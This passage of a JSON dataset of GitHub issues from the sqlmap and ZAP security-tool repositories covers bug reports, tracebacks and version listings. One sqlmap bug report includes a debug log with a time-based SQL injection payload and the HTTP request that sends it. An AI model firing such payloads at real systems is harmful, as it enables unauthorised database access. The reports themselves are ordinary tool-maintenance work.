~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"lib/request/basic.py\", line 156, in parseResponse\n    htmlParser(page if not status else \"%s\\n\\n%s\" % (status, page))\n    ~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"lib/parse/html.py\", line 89, in htmlParser\n    parseXmlFile(xmlfile, handler)\n    ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^\n  File \"lib/core/common.py\", line 2428, in parseXmlFile\n    parse(stream, handler)\n    ~~~~~^^^^^^^^^^^^^^^^^\n  File \"/usr/lib/python3.13/xml/sax/__init__.py\", line 33, in parse\n    parser.parse(source)\n    ~~~~~~~~~~~~^^^^^^^^\n  File \"/usr/lib/python3.13/xml/sax/expatreader.py\", line 105, in parse\n    xmlreader.IncrementalParser.parse(self, source)\n    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^\n  File \"/usr/lib/python3.13/xml/sax/xmlreader.py\", line 124, in parse\n    self.feed(buffer)\n    ~~~~~~~~~^^^^^^^^\n  File \"/usr/lib/python3.13/xml/sax/expatreader.py\", line 211, in feed\n    self._parser.Parse(data, isFinal)\n    ~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^\n  File \"/Modules/pyexpat.c\", line 471, in StartElement\n  File \"/usr/lib/python3.13/xml/",
+    "labels": [
+      "FUBAR"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-11T12:42:41+00:00",
+    "closed_at": "2026-03-11T13:25:42+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6030",
+    "language": "Python",
+    "author": "sqlmapreporter",
+    "comments_count": 1,
+    "code_snippets": [
+      {
+        "code": "Running version: 1.10.3.4#dev\nPython version: 3.13.11\nOperating system: Linux-6.18.9+****-amd64-x86_64-with-glibc2.42\nCommand line: sqlmap.py -u ************************************************************** --cookie=********************************************************\nTechnique: None\nBack-end DBMS: None",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6031,
+    "title": "Unhandled exception (#d129f678)",
+    "description": "```\nRunning version: 1.10.3.4#dev\nPython version: 3.13.11\nOperating system: Linux-6.18.9+****-amd64-x86_64-with-glibc2.42\nCommand line: sqlmap.py -u ************************************************************** --cookie=******************************************************** --parse-errors --batch\nTechnique: None\nBack-end DBMS: None\n```\n```\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 222, in main\n    start()\n    ~~~~~^^\n  File \"lib/core/decorators.py\", line 99, in _\n    result = f(*args, **kwargs)\n  File \"lib/controller/controller.py\", line 436, in start\n    if not checkConnection(suppressOutput=conf.forms):\n           ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"lib/controller/checks.py\", line 1501, in checkConnection\n    page, headers, _ = Request.queryPage(content=True, noteResponseTime=False)\n                       ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"lib/core/decorators.py\", line 99, in _\n    result = f(*args, **kwargs)\n  File \"lib/request/connect.py\", line 1596, in queryPage\n    page, headers, code = Connect.getPage(url=uri, get=get, post=post, method=method, cookie=cookie, ua=ua, referer=referer, host=host, silent=silent, auxHeaders=auxHeaders, response=response, raise404=raise404, ignoreTimeout=timeBasedCompare)\n                          ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"lib/request/connect.py\", line 998, in getPage\n    processResponse(page, responseHeaders, code, status)\n    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"lib/request/basic.py\", line 386, in processResponse\n    parseResponse(page, responseHeaders if kb.processResponseCounter < PARSE_HEADERS_LIMIT else None, status)\n    ~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"lib/request/basic.py\", line 153, in parseResponse\n    headersParser(headers)\n    ~~~~~~~~~~~~~^^^^^^^^^\n  File \"lib/parse/headers.py\", line 35, in headersParser\n    parseXmlFile(xmlfile, handler)\n    ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^\n  File \"lib/core/common.py\", line 2428, in parseXmlFile\n    parse(stream, handler)\n    ~~~~~^^^^^^^^^^^^^^^^^\n  File \"/usr/lib/python3.13/xml/sax/__init__.py\", line 33, in parse\n    parser.parse(source)\n    ~~~~~~~~~~~~^^^^^^^^\n  File \"/usr/lib/python3.13/xml/sax/expatreader.py\", line 105, in parse\n    xmlreader.IncrementalParser.parse(self, source)\n    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^\n  File \"/usr/lib/python3.13/xml/sax/xmlreader.py\", line 124, in parse\n    self.feed(buffer)\n    ~~~~~~~~~^^^^^^^^\n  File \"/usr/lib/python3.13/xml/sax/expatreader.py\", line 211, in feed\n    self._parser.Parse(data, isFinal)\n    ~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^\n  File \"/Modules/pyexpat.c\", line 471, in StartElement\n  File \"/usr/lib/python3.13/xml/sax/expatreader.py\", line ",
+    "labels": [
+      "duplicate"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-11T12:52:57+00:00",
+    "closed_at": "2026-03-11T13:24:07+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6031",
+    "language": "Python",
+    "author": "sqlmapreporter",
+    "comments_count": 1,
+    "code_snippets": [
+      {
+        "code": "Running version: 1.10.3.4#dev\nPython version: 3.13.11\nOperating system: Linux-6.18.9+****-amd64-x86_64-with-glibc2.42\nCommand line: sqlmap.py -u ************************************************************** --cookie=******************************************************** --parse-errors --batch\nTechnique: None\nBack-end DBMS: None",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6029,
+    "title": "TLS SNI does not match custom Host header when targeting IP",
+    "description": "**Describe the bug**\nWhen targeting an HTTPS endpoint using its direct IP address in the URL (`-u https://<IP>/`) and specifying a custom Host header via `--headers=\"Host: <hostname>\"` or `--host=\"<hostname>\"`, sqlmap does not set the TLS Server Name Indication (SNI) extension to match the custom Host header. This results in a `421 Misdirected Request` error from servers that require the TLS SNI to match the HTTP Host header. \nI'm targeting the direct IP to avoid CDN, but the web server needs a host header to resolve the correct application.\n\n**To Reproduce**\n1. Run a command targeting an IP but forcing a domain Host header:\n   `python sqlmap.py -u https://127.0.0.1/users?name=abbas --headers=\"Host: tryhackme.com\" -v 6`\nor `python sqlmap.py -u https://127.0.0.1/users?name=abbas --host=\"tryhackme.com\" -v 6`\n2. Observe the traffic output. The TLS handshake occurs with the IP address (or blank) as the SNI, while the HTTP request sends `Host: tryhackme.com`.\n3. See error: `421 Misdirected Request`.\n\n**Expected behavior**\nSqlmap should either automatically use the value of a user-supplied `Host` header for the TLS SNI extension during the handshake, or provide an explicit command-line flag (e.g., `--sni=\"tryhackme.com\"`) to allow users to set the SNI manually, similar to modern curl implementations or Postman.\n\n**Screenshots**\nN/A - Console output provided below.\n\n**Running environment:**\n - sqlmap version: 1.10.2.14#dev\n - Installation method: git clone\n - Operating system: Ubuntu 22.04\n - Python version: 3.13.3\n\n**Target details:**\n - DBMS: Unknown (connection blocked before reaching the application)\n - SQLi techniques found by sqlmap: N/A \n - WAF/IPS: Cloudflare\n - Relevant console output:\n```log \n[05:15:27] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'\n[05:15:27] [PAYLOAD] AX');WAITFOR DELAY '0:0:5'--\n[05:15:27] [TRAFFIC OUT] HTTP request [#37]:\nGET /users?name=AX%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1\nHost: tryhackme.com\nAuthorization: Basic \nUser-Agent: sqlmap/1.10.2.14#dev (https://sqlmap.org)\nAccept: */*\nAccept-Encoding: gzip,deflate\nConnection: close\n\n[05:15:27] [TRAFFIC IN] HTTP response [#37] (421 Misdirected Request):\nDate: Wed, 11 Mar 2026 04:15:26 GMT\nServer: Apache\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nContent-Length: 362\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\nURI: https://127.0.0.1/users?name=AX%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--\n\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">\n<html><head>\n<title>421 Misdirected Request</title>\n</head><body>\n<h1>Misdirected Request</h1>\n<p>The client needs a new connection for this\nrequest as the requested host name does not match\nthe Server Name Indication (SNI) in use for this\nconnection.</p>\n</body></html>\n\n[05:15:27] [DEBUG] got HTTP error code: 421 ('Misdirected Request')\n```",
+    "labels": [
+      "request",
+      "bug report"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-11T04:40:29+00:00",
+    "closed_at": "2026-03-11T12:07:38+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6029",
+    "language": "Python",
+    "author": "abbasudo",
+    "comments_count": 0,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 7138,
+    "title": "ZAP does not shutdown in command line mode if AJAX Spider fails to start the browser",
+    "description": "### Describe the bug\r\n\r\nThe process hangs (does not finish) after the automation plan succeeded if the job `spiderAjax` is included into the plan.\r\n\r\n### Steps to reproduce the behavior\r\n\r\n1. Create file `config.yaml` with the following content:\r\n    ~~~\r\n    --- # OWASP ZAP automation configuration file, for more details see https://www.zaproxy.org/docs/automate/automation-framework/\r\n    env:                                   # The environment, mandatory\r\n      contexts :                           # List of 1 or more contexts, mandatory\r\n        - name: my_context                 # Name to be used to refer to this context in other jobs, mandatory\r\n          urls:                            # A mandatory list of top level urls, everything under each url will be included\r\n            - \"http://example.com\"\r\n    jobs:\r\n      - type: spiderAjax\r\n    ~~~\r\n2. Run ZAP and see the output:\r\n    ~~~\r\n    $ zap.sh -cmd -autorun \"$(pwd)/config.yaml\"\r\n    Found Java version 17.0.2\r\n    Available memory: 25343 MB\r\n    Using JVM args: -Xmx6335m\r\n    Job spiderAjax started\r\n    Job spiderAjax found 0 URLs\r\n    Job spiderAjax finished\r\n    Automation plan succeeded!\r\n    ~~~\r\n3. Note that the process has not finished after the automation plan succeeded.\r\n\r\n### Expected behavior\r\n\r\nThe process has finished after the automation plan succeeded.\r\n\r\n### Software versions\r\n\r\n~~~\r\nOWASP ZAP\r\nVersion: 2.11.1\r\nInstalled Add-ons: [[id=alertFilters, version=13.0.0], [id=ascanrules, version=44.0.0], [id=automation, version=0.13.0], [id=bruteforce, version=11.0.0], [id=callhome, version=0.3.0], [id=commonlib, version=1.8.0], [id=diff, version=11.0.0], [id=directorylistv1, version=5.0.0], [id=domxss, version=12.0.0], [id=encoder, version=0.6.0], [id=exim, version=0.1.0], [id=formhandler, version=4.0.0], [id=fuzz, version=13.6.0], [id=gettingStarted, version=13.0.0], [id=graaljs, version=0.2.0], [id=graphql, version=0.7.0], [id=help, version=14.0.0], [id=hud, version=0.13.0], [id=importurls, version=9.0.0], [id=invoke, version=11.0.0], [id=network, version=0.0.1], [id=onlineMenu, version=9.0.0], [id=openapi, version=24.0.0], [id=pscanrules, version=39.0.0], [id=quickstart, version=33.0.0], [id=replacer, version=9.0.0], [id=reports, version=0.10.0], [id=retest, version=0.2.0], [id=retire, version=0.10.0], [id=reveal, version=4.0.0], [id=saverawmessage, version=7.0.0], [id=savexmlmessage, version=0.3.0], [id=scripts, version=30.0.0], [id=selenium, version=15.7.0], [id=soap, version=12.0.0], [id=spiderAjax, version=23.7.0], [id=tips, version=9.0.0], [id=webdriverlinux, version=33.0.0], [id=websocket, version=24.0.0], [id=zest, version=35.0.0]]\r\nOperating System: Linux\r\nJava Version: Private Build 17.0.2\r\nSystem's Locale: en\r\nDisplay Locale: en_GB\r\nFormat Locale: en_GB\r\nZAP Home Directory: /home/user/.ZAP/\r\nZAP Installation Directory: /opt/zaproxy/./\r\nLook and Feel: Metal (javax.swing.plaf.metal.MetalLookAndFeel)\r\n~~~\r\n\r\n### Screenshots\r\n\r\n_No response_\r\n\r\n### Errors from the zap",
+    "labels": [
+      "bug",
+      "add-on",
+      "crawljax",
+      "in:spiderAjax"
+    ],
+    "state": "closed",
+    "created_at": "2022-03-14T07:57:18+00:00",
+    "closed_at": "2026-01-09T13:57:42+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/7138",
+    "language": "Java",
+    "author": "AndreyMZ",
+    "comments_count": 25,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 9185,
+    "title": "InformationDisclosureSuspiciousCommentsScanRule should provide the comment leading up to `from` instead of just the word `from`",
+    "description": "### Describe the bug:\n\nhttps://github.com/zaproxy/zap-extensions/blob/2e441bfb3d068fed7fd790f33b23e1b80aae6823/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/InformationDisclosureSuspiciousCommentsScanRule.java#L68-L85\nincludes `FROM`\n\nhttps://github.com/zaproxy/zap-extensions/blob/2e441bfb3d068fed7fd790f33b23e1b80aae6823/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/InformationDisclosureSuspiciousCommentsScanRule.java#L93\nlooks for `//` followed by any number of characters\n\nAnd then it looks for the combination of the `//`, **any** number of characters, and any of the items including `from`\nhttps://github.com/zaproxy/zap-extensions/blob/2e441bfb3d068fed7fd790f33b23e1b80aae6823/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/InformationDisclosureSuspiciousCommentsScanRule.java#L101-L105\n\nand it does things case-insensitively:\nhttps://github.com/zaproxy/zap-extensions/blob/2e441bfb3d068fed7fd790f33b23e1b80aae6823/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/InformationDisclosureSuspiciousCommentsScanRule.java#L247\n\nFor a minified file, like monaco, that combination isn't particularly exciting or surprising.\n\nThere are 30 hits for `//.*\\bfrom\\b` in https://cdn.jsdelivr.net/npm/monaco-editor@0.55.1/+esm\n\nInstead of using the not terribly helpful rule, a slightly fancier rule of:\n```\n//(?:.(?!//)){1,100}?\\bfrom\\b\n```\nWould yield 3, which are closer to valid (although really not remotely close, but still closer):\n```js\n\\n\\t// Multiple vert.position by 2,-2 to get it into clipspace which ranged from -1 to 1\\n\\tvsOut.position = vec4f(\\n\\t\\t// Make everything relative to top left instead of center\\n\\t\\tvec2f(-1, 1) +\\n\\t\\t((vert.position * vec2f(2, -2)) / layoutInfo.canvasDims) * glyph.size +\\n\\t\\t((cell.position * vec2f(2, -2)) / layoutInfo.canvasDims) +\\n\\t\\t((glyph.origin * vec2f(2, -2)) / layoutInfo.canvasDims) +\\n\\t\\t(((layoutInfo.viewportOffset - scrollOffset.offset * vec2(1, -1)) * 2) / layoutInfo.canvasDims),\\n\\t\\t0.0,\\n\\t\\t1.0\\n\\t);\\n\\n\\tvsOut.layerIndex = cell.textureIndex;\\n\\t// Textures are flipped from natural direction on the y-axis, so flip it back\\n\\tvsOut.texcoord = vert.position;\\n\\tvsOut.texcoord = \n```\n\n```js\ncreateElementNS(\"http://www.w3.org/2000/svg\",\"path\");path.setAttribute(\"d\",`M ${0} ${line.from} \n```\n\nAlso, instead of providing evidence `from`, the code should report the capture. Given the constraint that a capture should have no more than 100 characters between the `//` and the word, that wouldn't be a terribly painful amount of content to show a reviewer, and would enable them to make a reasoned decision about the notice.\n\n### Steps to reproduce the behavior:\n\n1. Run a scan on a system that includes https://cdn.jsdelivr.net/npm/monaco-editor@0.55.1/+esm with InformationDisclosureSuspiciousCommentsScanRule\n\n### Expected behavior:\n\n1. Provide more context than just `from` for evidence\n2. Use a smaller window for characters after `//` (100",
+    "labels": [
+      "FalsePositive",
+      "add-on"
+    ],
+    "state": "closed",
+    "created_at": "2025-12-10T20:50:55+00:00",
+    "closed_at": "2026-01-09T19:06:56+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/9185",
+    "language": "Java",
+    "author": "jsoref",
+    "comments_count": 11,
+    "code_snippets": [
+      {
+        "code": "//(?:.(?!//)){1,100}?\\bfrom\\b",
+        "language": "unknown"
+      },
+      {
+        "code": "\\n\\t// Multiple vert.position by 2,-2 to get it into clipspace which ranged from -1 to 1\\n\\tvsOut.position = vec4f(\\n\\t\\t// Make everything relative to top left instead of center\\n\\t\\tvec2f(-1, 1) +\\n\\t\\t((vert.position * vec2f(2, -2)) / layoutInfo.canvasDims) * glyph.size +\\n\\t\\t((cell.position * vec2f(2, -2)) / layoutInfo.canvasDims) +\\n\\t\\t((glyph.origin * vec2f(2, -2)) / layoutInfo.canvasDims) +\\n\\t\\t(((layoutInfo.viewportOffset - scrollOffset.offset * vec2(1, -1)) * 2) / layoutInfo.canvasDims),\\n\\t\\t0.0,\\n\\t\\t1.0\\n\\t);\\n\\n\\tvsOut.layerIndex = cell.textureIndex;\\n\\t// Textures are flipped from natural direction on the y-axis, so flip it back\\n\\tvsOut.texcoord = vert.position;\\n\\tvsOut.texcoord =",
+        "language": "js"
+      },
+      {
+        "code": "createElementNS(\"http://www.w3.org/2000/svg\",\"path\");path.setAttribute(\"d\",`M ${0} ${line.from}",
+        "language": "js"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 9212,
+    "title": "Out of database space error with 2.17.0",
+    "description": "### Describe the bug:\n\n**Description**\nSome active scans that ran fine with 2.16.1 now fail halfway the scan on the following error:\n\n> Out of database space, ZAP will effectively be unusable.\n> Shutting down ZAP due to space issues...\n\n**Version used**\nThe problem occurs using version 2.17.0.\n\n**Additional context**\nDisk space error handling was recently changed with #9148; maybe that introduced the issue? At least, the error message _Out of database space, ZAP will effectively be unusable._ was added as part of that PR.\n\nUp until 2.16.1, the same scans completed successfully. In 2.17.0 no more. After reverting to 2.16.1, the scans are successful once more.\n\n### Steps to reproduce the behavior:\n\nThis happens consistently for several of my scenarios, when ZAP is well in to the scanning process / has been scanning for more than an hour. \nThese scenarios involve _active scans_ for urls recorded by the ZAP proxy for fixed paths through the application, started via the _/ascan/action/scan/_ endpoint.\n\nThis only happens for *some* fixed paths through the application. Perhaps only for those where the urls exceed some threshold.\n\n### Expected behavior:\n\nScanning should complete without database error, like in earlier versions.\nMaybe errors occurred with earlier versions as well, but were just not visible. But at least they did not fail the scan.\n\n### Software Versions:\n```\nFound Java version 21.0.10-ea\nAvailable memory: 32064 MB\nUsing JVM args: -Xmx8016m\nZAP\nVersion: 2.17.0\nInstalled Add-ons: [[id=alertFilters, version=26.0.0], [id=ascanrules, version=78.0.0], [id=authhelper, version=0.34.0], [id=automation, version=0.58.0], [id=bruteforce, version=20.0.0], [id=callhome, version=0.20.0], [id=client, version=0.20.0], [id=commonlib, version=1.39.0], [id=database, version=0.9.0], [id=diff, version=18.0.0], [id=directorylistv1, version=9.0.0], [id=domxss, version=23.0.0], [id=encoder, version=1.8.0], [id=exim, version=0.16.0], [id=formhandler, version=6.8.0], [id=fuzz, version=13.16.0], [id=gettingStarted, version=20.0.0], [id=graaljs, version=0.12.0], [id=graphql, version=0.29.0], [id=help, version=22.0.0], [id=hud, version=0.19.0], [id=insights, version=0.0.1], [id=invoke, version=17.0.0], [id=network, version=0.25.0], [id=oast, version=0.24.0], [id=onlineMenu, version=15.0.0], [id=openapi, version=48.0.0], [id=postman, version=0.9.0], [id=pscan, version=0.6.0], [id=pscanrules, version=70.0.0], [id=quickstart, version=53.0.0], [id=replacer, version=21.0.0], [id=reports, version=0.43.0], [id=requester, version=7.9.0], [id=retest, version=0.11.0], [id=retire, version=0.52.0], [id=reveal, version=10.0.0], [id=scanpolicies, version=0.7.0], [id=scripts, version=45.17.0], [id=selenium, version=15.43.0], [id=sequence, version=9.0.0], [id=soap, version=29.0.0], [id=spider, version=0.18.0], [id=spiderAjax, version=23.29.0], [id=tips, version=16.0.0], [id=webdriverlinux, version=169.0.0], [id=websocket, version=35.0.0], [id=zest, version=48.11.0]]\nOperating System:",
+    "labels": [
+      "bug"
+    ],
+    "state": "closed",
+    "created_at": "2026-01-07T07:46:21+00:00",
+    "closed_at": "2026-01-07T09:12:12+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/9212",
+    "language": "Java",
+    "author": "GunoH",
+    "comments_count": 8,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 9206,
+    "title": "Duplicate HTML id attributes in FormsForValueGenerator.html cause DOM and accessibility issues",
+    "description": "### Describe the bug:\n\nThe file zap/src/main/resources/org/zaproxy/zap/spider/parser/htmlform/FormsForValueGenerator.html contains multiple HTML elements with duplicate id attribute values (e.g., id=\"id1\" and id=\"id2\" reused within the same document).\nAccording to the HTML specification, id values must be unique within a document. Duplicate IDs can lead to incorrect DOM behavior, broken JavaScript interactions, and accessibility issues.\nThis issue was identified via static analysis (SonarCloud rule Web:S7930) and confirmed by manual inspection.\nThis is a standards-compliance and reliability bug, not a security vulnerability.\n\n### Steps to reproduce the behavior:\n\n1. Open the file:\nzap/src/main/resources/org/zaproxy/zap/spider/parser/htmlform/FormsForValueGenerator.html\n2. Inspect the HTML source.\n3. Observe multiple elements sharing the same id values (e.g., id=\"id1\" and id=\"id2\").\n4. (Optional) Run a static analysis tool (e.g., SonarCloud or HTML validator) to confirm duplicate ID warnings.\n\n### Expected behavior:\n\nEach HTML element should have a unique id attribute within the document, in compliance with the HTML specification.\n\nThis ensures:\nCorrect DOM access via JavaScript\nPredictable CSS targeting\nProper association of <label> elements\nCorrect behavior of assistive technologies (screen readers)\n\n### Software Versions:\n\nZAP: latest main branch (observed directly in repository source)\nOS: Not applicable (static resource)\n\n### Screenshots:\n\n_No response_\n\n### Errors from the zap.log file:\n\nNot applicable — this issue does not produce runtime errors and was identified through static analysis and code inspection.\n\n### Additional context:\n\nSonarCloud flags this as a Critical reliability issue (Web:S7930).\nThis is not a security issue and does not introduce an exploitable condition.\nFixing this would improve HTML correctness, accessibility (WCAG compliance), and maintainability.\nI am happy to submit a pull request to fix the duplicate IDs if this approach is acceptable.\n\n### Would you like to help fix this issue?\n\n- [x] Yes",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-01-02T14:32:29+00:00",
+    "closed_at": "2026-01-02T14:48:57+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/9206",
+    "language": "Java",
+    "author": "S3DFX-CYBER",
+    "comments_count": 6,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 9261,
+    "title": "OpenAPI: ZAP generates a string instead of an array",
+    "description": "Reported on the ZAP User Group: https://groups.google.com/g/zaproxy-users/c/BtpkqOjroNg/m/CaHlypCBFAAJ\n\nSchema example which demonstrates the problem:\n\n```\n{\n  \"openapi\": \"3.1.0\",\n  \"info\": {\n    \"title\": \"Management API\",\n    \"description\": \"Service\",\n    \"contact\": {\n      \"name\": \"masked\",\n      \"url\": \"https://www.masked.com\",\n      \"email\": \"masked@gmail.si\"\n    },\n    \"version\": \"2024a-2602030953-632cc6f0\"\n  },\n  \"servers\": [\n    {\n      \"url\": \"https://masked.mak/subscriber-api\",\n      \"description\": \"Generated server url\"\n    }\n  ],\n  \"tags\": [\n    {\n      \"name\": \"Subscribers API\",\n      \"description\": \"Collection of Subscribers API methods\"\n    }\n  ],\n  \"paths\": {\n    \"/subscribers/api/v2\": {\n      \"get\": {\n        \"tags\": [\n          \"Subscribers API\"\n        ],\n        \"summary\": \"Get list of subscribers\",\n        \"description\": \"Returns list of subscribers\",\n        \"operationId\": \"GetSubscribers\",\n        \"parameters\": [\n          {\n            \"name\": \"supi\",\n            \"in\": \"query\",\n            \"description\": \"SUPI\",\n            \"required\": false,\n            \"schema\": {\n              \"type\": \"string\"\n            },\n            \"example\": \"7805599329626733\"\n          },\n          {\n            \"name\": \"offset\",\n            \"in\": \"query\",\n            \"description\": \"Result offset\",\n            \"required\": false,\n            \"schema\": {\n              \"type\": \"integer\",\n              \"format\": \"int32\",\n              \"default\": 0\n            },\n            \"example\": 0\n          },\n          {\n            \"name\": \"limit\",\n            \"in\": \"query\",\n            \"description\": \"Limit number of results\",\n            \"required\": false,\n            \"schema\": {\n              \"type\": \"integer\",\n              \"format\": \"int32\",\n              \"default\": 10\n            },\n            \"example\": 10\n          }\n        ],\n        \"responses\": {\n          \"200\": {\n            \"description\": \"OK\",\n            \"content\": {\n              \"application/json\": {\n                \"schema\": {\n                  \"type\": \"array\",\n                  \"items\": {\n                    \"$ref\": \"#/components/schemas/Subscriber\"\n                  }\n                }\n              }\n            }\n          },\n          \"500\": {\n            \"description\": \"Internal Server Error\",\n            \"content\": {\n              \"application/json\": {\n                \"schema\": {\n                  \"$ref\": \"#/components/schemas/ErrorMessage\"\n                }\n              }\n            }\n          }\n        },\n        \"security\": [\n          {\n            \"subscriber-api\": []\n          }\n        ]\n      },\n      \"post\": {\n        \"tags\": [\n          \"Subscribers API\"\n        ],\n        \"summary\": \"Creates list of subscribers\",\n        \"description\": \"Creates list of subscribers\",\n        \"operationId\": \"CreateSubscribers\",\n        \"requestBody\": {\n          \"required\": true,\n          \"content\": {\n            \"application/json\": {\n              \"schema\": {\n                \"type\": \"",
+    "labels": [
+      "bug",
+      "add-on",
+      "in:openapi"
+    ],
+    "state": "closed",
+    "created_at": "2026-02-27T10:09:59+00:00",
+    "closed_at": "2026-03-13T10:48:06+00:00",
+    "url": "https://github.com/zaproxy/zaproxy/issues/9261",
+    "language": "Java",
+    "author": "psiinon",
+    "comments_count": 5,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "zaproxy/zaproxy",
+    "issue_number": 9193,
+    "title": "AccessDeniedException /zap/wrk/report.html - Unable to save report in the /zap/wrk folder",
+    "description": "### Describe the bug:\n\nWhile working on the latest zap-stable image. I not able to get the report of the baseline scan. Because when I mount the /zap/wrk the user assigned to is 1001:1001 not zap:zap. here is some proof. \n\n`sudo docker run -v $(pwd):/zap/wrk:rw -it zaproxy/zap-stable:latest /bin/bash`\n\n<img width=\"786\" height=\"798\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/733eff5d-fc72-4e02-ada0-42a7e898ce70\" />\n\n\n`sudo docker run -w /zap -v $(pwd):/zap/wrk:rw --rm zaproxy/zap-stable:latest zap-baseline.py -t \"https://example.com\" -r report.html`\n\n```\n2025-12-18 06:49:55,128 Unable to copy yaml file to /zap/wrk/zap.yaml [Errno 13] Permission denied: '/zap/wrk/zap.yaml'\nUsing the Automation Framework\nTotal of 3 URLs\nPASS: Vulnerable JS Library (Powered by Retire.js) [10003]\nPASS: In Page Banner Information Leak [10009]\nPASS: Cookie No HttpOnly Flag [10010]\nPASS: Cookie Without Secure Flag [10011]\nPASS: Cross-Domain JavaScript Source File Inclusion [10017]\nPASS: Content-Type Header Missing [10019]\nPASS: Information Disclosure - Debug Error Messages [10023]\nPASS: Information Disclosure - Sensitive Information in URL [10024]\nPASS: Information Disclosure - Sensitive Information in HTTP Referrer Header [10025]\nPASS: HTTP Parameter Override [10026]\nPASS: Information Disclosure - Suspicious Comments [10027]\nPASS: Off-site Redirect [10028]\nPASS: Cookie Poisoning [10029]\nPASS: User Controllable Charset [10030]\nPASS: User Controllable HTML Element Attribute (Potential XSS) [10031]\nPASS: Viewstate [10032]\nPASS: Directory Browsing [10033]\nPASS: Heartbleed OpenSSL Vulnerability (Indicative) [10034]\nPASS: HTTP Server Response Header [10036]\nPASS: Server Leaks Information via \"X-Powered-By\" HTTP Response Header Field(s) [10037]\nPASS: X-Backend-Server Header Information Leak [10039]\nPASS: Secure Pages Include Mixed Content [10040]\nPASS: HTTP to HTTPS Insecure Transition in Form Post [10041]\nPASS: HTTPS to HTTP Insecure Transition in Form Post [10042]\nPASS: User Controllable JavaScript Event (XSS) [10043]\nPASS: Big Redirect Detected (Potential Sensitive Information Leak) [10044]\nPASS: X-ChromeLogger-Data (XCOLD) Header Information Leak [10052]\nPASS: Cookie without SameSite Attribute [10054]\nPASS: CSP [10055]\nPASS: X-Debug-Token Information Leak [10056]\nPASS: Username Hash Found [10057]\nPASS: X-AspNet-Version Response Header [10061]\nPASS: PII Disclosure [10062]\nPASS: Timestamp Disclosure [10096]\nPASS: Hash Disclosure [10097]\nPASS: Cross-Domain Misconfiguration [10098]\nPASS: Source Code Disclosure [10099]\nPASS: Weak Authentication Method [10105]\nPASS: Reverse Tabnabbing [10108]\nPASS: Modern Web Application [10109]\nPASS: Dangerous JS Functions [10110]\nPASS: Authentication Request Identified [10111]\nPASS: Session Management Response Identified [10112]\nPASS: Verification Request Identified [10113]\nPASS: Script Served From Malicious Domain (polyfill) [10115]\nPASS: ZAP is Out of Date [10116]\nPASS: Absence of Anti-CSRF Tokens 